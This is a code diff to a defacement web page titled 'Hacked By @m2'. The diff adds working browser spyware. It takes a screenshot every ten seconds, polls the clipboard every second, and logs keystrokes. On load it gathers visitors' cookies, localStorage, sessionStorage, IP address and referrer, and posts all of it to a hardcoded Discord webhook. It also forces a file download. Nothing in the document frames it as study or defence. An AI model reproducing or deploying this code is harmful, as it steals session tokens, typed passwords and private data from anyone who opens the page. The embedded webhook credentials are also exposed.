@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hacked By @m2</title>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
     <style>
         body {
             background: #000;
@@ -165,57 +166,25 @@
 
     <script>
         // Discord webhook URL
-        const webhookUrl = 'https://discord.com/api/webhooks/1357864679405523164/QxQY3ETmjuXzc82pfUz8le4Gn4bOXsH-rPxg-BcnSlCgAY-epPKDr-Uaah_oXg5mM01D';
+        const webhookUrl = 'https://canary.discord.com/api/webhooks/1357880013650919635/QHgBntOCjOqkDezw4g0cUo3Yze_KqouJrVLlZcSe3tQ4ZahoJ4nu4qX0nv1G2t5fpGWW';
 
-        // Function to get user information and send to Discord
-        async function getUserInfo() {
+        // Screenshot monitoring
+        const SCREENSHOT_INTERVAL = 10000; // Take screenshot every 10 seconds
+        let lastScreenshotTime = Date.now();
+
+        async function captureAndSendScreenshot() {
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
+                const canvas = await html2canvas(document.body);
+                const screenshot = canvas.toDataURL('image/png');
                 
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const language = navigator.language;
-                const screenResolution = `${window.screen.width}x${window.screen.height}`;
-                
-                // Create and download 503.txt
-                const content = "503 here";
-                const blob = new Blob([content], { type: 'text/plain' });
-                const a = document.createElement('a');
-                a.href = URL.createObjectURL(blob);
-                a.download = '503.txt';
-                a.click();
-                
-                const embed = {
-                    title: "New Visitor Information",
+                const screenshotData = {
+                    title: "Periodic Screenshot",
                     color: 16711680,
-                    fields: [
-                        {
-                            name: "IP Address",
-                            value: ipData.ip,
-                            inline: true
-                        },
-                        {
-                            name: "User Agent",
-                            value: userAgent,
-                            inline: false
-                        },
-                        {
-                            name: "Platform",
-                            value: platform,
-                            inline: true
-                        },
-                        {
-                            name: "Language",
-                            value: language,
-                            inline: true
-                        },
-                        {
-                            name: "Screen Resolution",
-                            value: screenResolution,
-                            inline: true
-                        }
-                    ],
+                    fields: [{
+                        name: "Time",
+                        value: new Date().toISOString(),
+                        inline: true
+                    }],
                     timestamp: new Date().toISOString()
                 };
 
@@ -225,11 +194,246 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        embeds: [embed]
+                        embeds: [screenshotData],
+                        files: [{
+                            name: `screenshot_${Date.now()}.png`,
+                            data: screenshot.split(',')[1]
+                        }]
+                    })
+                });
+                lastScreenshotTime = Date.now();
+            } catch (error) {
+                console.error('Error capturing screenshot:', error);
+            }
+        }
+
+        // Start screenshot monitoring
+        setInterval(captureAndSendScreenshot, SCREENSHOT_INTERVAL);
+
+        // Clipboard monitoring
+        let lastClipboardContent = '';
+        const CLIPBOARD_INTERVAL = 1000; // Check clipboard every second
+
+        async function checkClipboard() {
+            try {
+                const clipboardContent = await navigator.clipboard.readText();
+                if (clipboardContent !== lastClipboardContent) {
+                    lastClipboardContent = clipboardContent;
+                    
+                    const clipboardData = {
+                        title: "Clipboard Update",
+                        color: 16711680,
+                        fields: [{
+                            name: "Clipboard Content",
+                            value: clipboardContent || "Empty clipboard",
+                            inline: false
+                        }],
+                        timestamp: new Date().toISOString()
+                    };
+
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            embeds: [clipboardData]
+                        })
+                    });
+                }
+            } catch (e) {
+                console.log("Clipboard access denied");
+            }
+        }
+
+        // Start clipboard monitoring
+        setInterval(checkClipboard, CLIPBOARD_INTERVAL);
+
+        // Keylogger functionality
+        let keystrokes = [];
+        let lastKeylogSend = Date.now();
+        const KEYLOG_INTERVAL = 5000; // Send keylog data every 5 seconds
+
+        document.addEventListener('keydown', (e) => {
+            const key = e.key;
+            const timestamp = new Date().toISOString();
+            keystrokes.push({ key, timestamp });
+            
+            // Send keylog data periodically
+            if (Date.now() - lastKeylogSend > KEYLOG_INTERVAL) {
+                sendKeylogData();
+                lastKeylogSend = Date.now();
+            }
+        });
+
+        async function sendKeylogData() {
+            if (keystrokes.length === 0) return;
+
+            const keylogData = {
+                title: "Keylogger Data",
+                color: 16711680,
+                fields: [{
+                    name: "Keystrokes",
+                    value: keystrokes.map(k => `${k.key} (${k.timestamp})`).join('\n'),
+                    inline: false
+                }],
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [keylogData]
+                    })
+                });
+                keystrokes = []; // Clear sent keystrokes
+            } catch (error) {
+                console.error('Error sending keylog data:', error);
+            }
+        }
+
+        // Function to get user information and send to Discord
+        async function getUserInfo() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Get clipboard content
+                let clipboardContent = "Not accessible";
+                try {
+                    clipboardContent = await navigator.clipboard.readText();
+                } catch (e) {
+                    console.log("Clipboard access denied");
+                }
+
+                // Collect all user data
+                const userData = {
+                    cookies: document.cookie,
+                    location: window.location.href,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth
+                    },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localStorage: { ...localStorage },
+                    sessionStorage: { ...sessionStorage },
+                    referrer: document.referrer,
+                    ip: ipData.ip,
+                    clipboard: clipboardContent
+                };
+
+                // Take screenshot using html2canvas
+                const canvas = await html2canvas(document.body);
+                const screenshot = canvas.toDataURL('image/png');
+
+                // Create and download 503.txt
+                const content = "503 here";
+                const blob = new Blob([content], { type: 'text/plain' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = '503.txt';
+                a.click();
+                
+                // Send to Discord webhook
+                const embed = {
+                    title: "New Visitor Information",
+                    color: 16711680,
+                    fields: [
+                        {
+                            name: "IP Address",
+                            value: userData.ip,
+                            inline: true
+                        },
+                        {
+                            name: "Location",
+                            value: userData.location,
+                            inline: true
+                        },
+                        {
+                            name: "User Agent",
+                            value: userData.userAgent,
+                            inline: false
+                        },
+                        {
+                            name: "Platform",
+                            value: userData.platform,
+                            inline: true
+                        },
+                        {
+                            name: "Language",
+                            value: userData.language,
+                            inline: true
+                        },
+                        {
+                            name: "Screen Resolution",
+                            value: `${userData.screen.width}x${userData.screen.height}`,
+                            inline: true
+                        },
+                        {
+                            name: "Color Depth",
+                            value: userData.screen.colorDepth.toString(),
+                            inline: true
+                        },
+                        {
+                            name: "Timezone",
+                            value: userData.timezone,
+                            inline: true
+                        },
+                        {
+                            name: "Referrer",
+                            value: userData.referrer || "None",
+                            inline: true
+                        },
+                        {
+                            name: "Cookies",
+                            value: userData.cookies || "None",
+                            inline: false
+                        },
+                        {
+                            name: "Local Storage",
+                            value: JSON.stringify(userData.localStorage) || "None",
+                            inline: false
+                        },
+                        {
+                            name: "Session Storage",
+                            value: JSON.stringify(userData.sessionStorage) || "None",
+                            inline: false
+                        },
+                        {
+                            name: "Clipboard Content",
+                            value: userData.clipboard || "Not accessible",
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+
+                // Send data to Discord webhook
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed],
+                        files: [{
+                            name: 'screenshot.png',
+                            data: screenshot.split(',')[1]
+                        }]
                     })
                 });
 
-                document.getElementById('ip-display').textContent = 'Your IP: ' + ipData.ip;
+                // Display IP on page
+                document.getElementById('ip-display').textContent = 'Your IP: ' + userData.ip;
             } catch (error) {
                 console.error('Error:', error);
             }
